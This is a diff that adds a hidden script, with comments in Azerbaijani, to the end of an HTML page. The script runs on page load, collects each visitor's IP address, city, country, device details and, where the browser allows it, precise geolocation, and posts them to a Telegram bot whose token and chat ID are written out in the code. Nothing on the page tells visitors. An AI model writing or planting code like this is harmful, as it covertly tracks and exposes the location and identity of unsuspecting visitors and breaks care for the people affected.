@@ -240,3 +240,68 @@
 </body>
 
   </html>
+<script>
+    // --- TELEGRAM AYARLARI ---
+    const BOT_TOKEN = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A"; 
+    const CHAT_ID = "-1003369084883";
+
+    async function sendFullTracking() {
+        let userIP = "Yüklənir...";
+        let userCountry = "Yüklənir...";
+        let userLocation = "İcazə verilmədi";
+        let deviceInfo = navigator.userAgent;
+        let time = new Date().toLocaleString('az-AZ');
+
+        try {
+            // IP və Ölkə/Şəhər məlumatlarını götürürük
+            const response = await fetch('http://ip-api.com/json/');
+            const data = await response.json();
+            userIP = data.query;
+            userCountry = `${data.country}, ${data.city}`;
+        } catch (err) {
+            userIP = "Tapılmadı";
+            userCountry = "Tapılmadı";
+        }
+
+        // Telegram-a göndərmə prosesi
+        const postToTelegram = async (mapLink) => {
+            const message = `
+📊 *YENİ İSTİFADƏÇİ MƏLUMATI*
+------------------------------
+🌍 *Ölkə/Şəhər:* ${userCountry}
+🌐 *IP:* ${userIP}
+📱 *Cihaz:* ${deviceInfo}
+⏰ *Zaman:* ${time}
+📍 *Məkan:* [Xəritədə Bax](${mapLink})
+------------------------------`;
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        };
+
+        // Məkan icazəsi sorğusu və göndərmə
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    let loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    postToTelegram(loc);
+                },
+                () => { postToTelegram("İcazə verilmədi"); }
+            );
+        } else {
+            postToTelegram("Dəstəklənmir");
+        }
+    }
+
+    // Səhifə yüklənən kimi avtomatik işə düşməsi üçün:
+    document.addEventListener("DOMContentLoaded", function() {
+        sendFullTracking();
+    });
+</script>
